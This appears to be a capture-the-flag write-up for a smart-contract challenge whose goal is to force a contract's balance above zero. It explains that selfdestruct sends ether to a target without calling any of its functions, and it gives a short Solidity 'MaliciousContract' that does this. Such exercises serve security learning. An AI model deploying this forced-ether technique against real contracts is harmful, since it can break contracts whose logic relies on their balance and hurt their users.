# Requirements

- Make the balance of the contract greater than zero.

# Attack explanation

selfdestruct(address) function removes all bytecode from a sc and sends all ether stored to the specified address. If specified address is also a contract, no functions get called. In other words, an attacker can forcefully send eth to a target.

# Attack function

We could solve the challenge by just using the following attack proxy sc:

```
contract MaliciousContract {
  address payable public vulnerableScAddress;
  address public attacker;

  constructor(address _vulnerableScAddress) payable {
      vulnerableScAddress = payable(_vulnerableScAddress);
      attacker = msg.sender;
  }

  function attack() public {
      selfdestruct(vulnerableScAddress);
  }
}
```
